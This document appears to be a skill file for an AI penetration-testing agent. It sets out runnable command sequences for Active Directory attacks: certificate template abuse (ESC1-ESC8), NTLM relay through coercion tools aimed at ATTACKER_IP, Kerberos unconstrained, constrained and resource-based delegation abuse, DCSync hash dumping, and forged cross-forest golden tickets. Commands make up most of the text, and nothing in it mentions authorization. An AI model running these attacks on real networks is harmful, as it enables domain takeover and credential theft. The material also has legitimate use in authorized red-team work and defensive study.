# /adcs-kerberos-deep — Deep Dive: ADCS ESC Attacks & Kerberos Delegation Abuse

> **Skill type:** Active Directory (Advanced)  
> **Source:** SpecterOps "Certified Pre-Owned" (2021), harmj0y Kerberos research, Will Schroeder BloodHound  
> **Chains into:** `/ad-assessment`, `/lateral-movement`, `/reporting`  
> **Chained from:** `/ad-assessment` (AD environment identified)

---

## Purpose

Deep methodology for the most powerful AD attack chains: ADCS ESC1-ESC8, Kerberos delegation abuse (unconstrained, constrained, resource-based), and forest trust exploitation.

---

## ADCS (Active Directory Certificate Services) Attacks

### ESC1: User-Controlled Subject Alternative Name

```bash
# Conditions: Template allows client supply of SAN + EKU includes Client Auth + low-priv enrollment

# Enumerate vulnerable templates
certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable -enabled
# Look for: VULNERABILITY: ESC1

# Exploit: Request certificate for Administrator
certipy req \
  -u low_priv_user@domain.local \
  -p password \
  -dc-ip DC_IP \
  -target CA_SERVER \
  -template VulnerableTemplate \
  -upn administrator@domain.local \
  -out administrator.pfx

# Authenticate using the certificate (PKINIT)
certipy auth \
  -pfx administrator.pfx \
  -dc-ip DC_IP \
  -username administrator \
  -domain domain.local
# Output: NT hash for administrator + TGT

# Use hash for PTH / DCSync
secretsdump.py -hashes :NTLM_HASH administrator@DC_IP
```

### ESC2: Any Purpose or No EKU

```bash
# Template has Any Purpose EKU or no EKU → can be used for any authentication
# Same exploit as ESC1 if subject name is also controllable
certipy req -u user@domain.local -p pass -dc-ip DC_IP \
  -target CA -template ESC2Template -upn administrator@domain.local
```

### ESC3: Enrollment Agent Templates

```bash
# Two-step attack:
# Step 1: Get Enrollment Agent certificate using ESC3-vulnerable template
certipy req -u user@domain.local -p pass -dc-ip DC_IP \
  -target CA -template EnrollmentAgent

# Step 2: Use Enrollment Agent cert to request cert ON BEHALF OF administrator
certipy req -u user@domain.local -p pass -dc-ip DC_IP \
  -target CA -template User \
  -on-behalf-of domain\\administrator \
  -pfx enrollment-agent.pfx
```

### ESC4: Template with Write ACL

```bash
# If you have WriteProperty/GenericWrite on a template:
# 1. Modify template to be vulnerable to ESC1
certipy template \
  -u user@domain.local -p pass \
  -dc-ip DC_IP \
  -template VulnerableTemplate \
  -save-old  # Backup original config

# 2. Exploit as ESC1
certipy req -u user@domain.local -p pass -dc-ip DC_IP \
  -target CA -template VulnerableTemplate -upn administrator@domain.local

# 3. Restore template (cleanup)
certipy template -u user@domain.local -p pass -dc-ip DC_IP \
  -template VulnerableTemplate -configuration original.json
```

### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set → ANY template allows SAN
# Even templates not designed for ESC1 become exploitable

# Check the flag
certipy find -u user@domain.local -p pass -dc-ip DC_IP
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 in CA properties

# Exploit: use any template + specify SAN
certipy req -u user@domain.local -p pass -dc-ip DC_IP \
  -target CA -template User \
  -upn administrator@domain.local
```

### ESC8: NTLM Relay to AD CS Web Enrollment

```bash
# Conditions: AD CS has HTTP enrollment enabled + target host has NTLM auth

# Step 1: Set up ntlmrelayx targeting AD CS
ntlmrelayx.py \
  -t http://CA_SERVER/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController  # For DC compromise

# Step 2: Coerce DC authentication to our relay listener
# (DC authenticates → relayed to AD CS → get DC certificate)
# Coercion techniques:
# - PetitPotam: python3 PetitPotam.py ATTACKER_IP DC_IP
# - PrintSpooler: python3 printerbug.py domain/user:pass@DC ATTACKER_IP
# - DFSCoerce: python3 dfscoerce.py -u user -p pass DC_IP ATTACKER_IP

python3 PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP  # Unauthenticated on older DC

# Step 3: ntlmrelayx captures NTLM auth → relays to AD CS
# Output: base64-encoded certificate for DC machine account

# Step 4: Use DC certificate for DCSync
certipy auth -pfx dc.pfx -dc-ip DC_IP -username DC$ -domain domain.local
# Get DC machine account NT hash → DCSync possible
secretsdump.py -hashes :DC_HASH 'domain/DC$@DC_IP'
```

---

## Kerberos Delegation Attacks

### Unconstrained Delegation

```bash
# Find hosts with Unconstrained Delegation (dangerous! DA visits = capture their TGT)
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Via BloodHound: "Computers with Unconstrained Delegation"

# Attack: Coerce DC to authenticate to our unconstrained delegation host
# (We're on WEBSERVER01 which has unconstrained delegation)

# 1. Monitor for incoming TGTs
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
# Or use Rubeus
Rubeus.exe monitor /interval:5 /nowrap  # Monitor for new TGTs

# 2. Coerce DC authentication to this host
python3 PetitPotam.py -u user -p pass WEBSERVER01 DC_IP

# 3. Capture DC TGT
# Rubeus shows "DC$" TGT received → import and DCSync
Rubeus.exe ptt /ticket:[base64_ticket]
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
```

### Constrained Delegation

```bash
# Find accounts with Constrained Delegation
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo

# Attack: Request service ticket on behalf of Administrator
# (Using compromised service account with constrained delegation)

# Rubeus S4U attack
Rubeus.exe s4u \
  /user:constrained_account \
  /rc4:NTLM_HASH \
  /impersonateuser:administrator \
  /msdsspn:cifs/target.domain.local \
  /domain:domain.local \
  /dc:DC_IP \
  /ptt

# Now access the target service as administrator
ls \\target.domain.local\C$
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# If we have GenericWrite on a computer object → RBCD attack
# (Add our controlled machine account to the target's msDS-AllowedToActOnBehalfOfOtherIdentity)

# Step 1: Create a machine account (if no existing one)
# Requires ms-DS-MachineAccountQuota > 0 (usually 10 by default)
python3 addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilPass123' \
  -dc-host DC_IP -domain-netbios DOMAIN \
  'domain/user:password'

# Step 2: Configure RBCD on target
python3 rbcd.py -f 'EVIL$' -t TARGET_COMPUTER \
  -dc-ip DC_IP 'domain/user:password'

# Step 3: S4U2Proxy to impersonate admin
python3 getST.py -spn cifs/TARGET.domain.local \
  -impersonate Administrator \
  -dc-ip DC_IP 'domain/EVIL$:EvilPass123'

# Step 4: Use ticket
export KRB5CCNAME=Administrator@cifs_TARGET.ccache
secretsdump.py -k -no-pass domain.local/Administrator@TARGET.domain.local
```

---

## Forest Trust Exploitation

```bash
# Enumerate trusts
nltest /domain_trusts /all_trusts
Get-ADTrust -Filter *

# Trust types:
# Bidirectional = A trusts B AND B trusts A
# One-way = A trusts B (A can access B's resources)
# Forest trust = cross-forest, SID filtering (usually)

# SID History injection (if SID filtering disabled)
# If forest trust with SID filtering disabled (sIDHistory not filtered):
# Add Enterprise Admins SID (S-1-5-21-RootDomain-519) to user's SID history
# → User gains Enterprise Admin rights in the root domain

# Forge inter-realm TGT
mimikatz.exe "lsadump::trust /patch" "exit"  # Get trust key
mimikatz.exe "kerberos::golden /user:administrator /domain:child.domain.local /sid:CHILD_SID /sids:FOREST_ENTERPRISE_ADMIN_SID /rc4:TRUST_KEY /service:krbtgt /target:domain.local /ticket:cross-realm.kirbi" "exit"

# Use ticket to access parent forest DC
Rubeus.exe asktgs /ticket:cross-realm.kirbi /service:cifs/parentdc.domain.local /dc:PARENT_DC /ptt
```
